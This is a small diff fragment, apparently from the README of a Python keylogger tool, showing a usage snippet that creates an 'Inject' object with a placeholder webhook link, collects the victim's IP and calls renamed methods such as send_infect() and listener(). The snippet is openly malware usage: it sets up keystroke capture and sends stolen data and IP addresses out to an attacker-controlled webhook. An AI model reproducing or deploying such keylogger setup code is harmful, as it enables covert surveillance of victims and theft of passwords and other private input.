@@ -33,8 +33,8 @@ from Keylogger import Inject
 
 Injector = Inject(hook="YOUR WEBHOOK LINK")
 Injector.get_ip()
-Injector.run()
-Injector.listener_s()
+Injector.send_infect()
+Injector.listener()
 ```
 
 
